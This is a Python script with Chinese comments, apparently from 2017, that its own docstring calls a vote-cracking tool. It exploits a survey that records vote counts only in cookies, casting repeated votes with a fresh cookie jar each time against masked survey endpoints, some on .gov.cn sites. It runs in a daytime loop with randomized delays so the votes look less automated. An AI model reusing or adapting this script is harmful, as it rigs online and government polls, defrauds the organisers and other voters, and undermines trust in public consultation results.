# -*- coding: utf-8 -*-
#!/usr/bin/python3

'''
具有漏洞的投票破解
主要原理是：得到投票地址，并进行投票，到达投票次数后清除浏览器缓存，然后继续投票
漏洞说明：网站方将投票次数记录在cookie中，所以清除浏览器缓存即可清除cookie记录
author：wangxch
2017年1月1日
'''

import urllib
import http.cookiejar
import time
import random

class Vote:
    def __init__(self, kunTicket, kfbTicket, ygbTicket):
        self.kunUrl = "http://www.***.cn/module/web/survey/opr_ajax_info.jsp?i_artid=7227&i_typeid=13"
        self.kfbUrl = "http://www.***.gov.cn/module/web/survey/opr_ajax_info.jsp?i_artid=7527&i_typeid=15"
        self.ygbUrl = "http://www.***.gov.cn/module/web/survey/opr_ajax_info.jsp?i_artid=7526&i_typeid=15"
        
        self.kunTicket = kunTicket
        self.kfbTicket = kfbTicket
        self.ygbTicket = ygbTicket

        self.kun_data = {
            'i_artid': '7227',
            'i_typeid': '13'
        }
        self.kfb_data = {
            'i_artid': '7527',
            'i_typeid': '15'
        }
    def vote(self, url):
        cookie = http.cookiejar.CookieJar()
        handler = urllib.request.HTTPCookieProcessor(cookie)
        opener = urllib.request.build_opener(handler)

        kunHtml = opener.open(url).read()
        isSuccess = False

        if kunHtml.strip() == b'success':
            print(u"投票成功")
        else:
            print(u"投票失败")

    def main(self):
        print("vote to kunTicket number is %s" % self.kunTicket)
        for count in range(0, self.kunTicket):
            self.vote(self.kunUrl)
                
        print("vote to kfbUrl number is %s" % self.kfbTicket)
        for count in range(0, self.kfbTicket):
            self.vote(self.kfbUrl)

##        print("vote to kunTicket number is %s" % self.ygbTicket)
##        for count in range(0, self.ygbTicket):
##            time.sleep(random.randint(1,5))
##            self.vote(self.ygbUrl)
##            self.vote(self.ygbUrl)
##            self.vote(self.ygbUrl)
if __name__ == "__main__":
    kunTicket = 10##    kunTicket = int(input("请输入想要给坤哥投的票数："))
    kfbTicket = 3##    kfbTicket = int(input("请输入想要给开发部投的票数："))
    ygbTicket = 100
    vote = Vote(kunTicket, kfbTicket, ygbTicket)
    for i in range(300000000*6):
        timeNow = int(time.strftime('%H',time.localtime(time.time())))
        if(timeNow>8 and timeNow<21):
            vote.main()
            randomtime = random.randint(1,5)
            print ("本次投票结束时间%s" % str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))))
            print ("%s分钟后再次投票" % (str(randomtime)))
            time.sleep(int(randomtime)*60)
            print (u"时间间隔%s分钟" % (str(randomtime)))
            
    
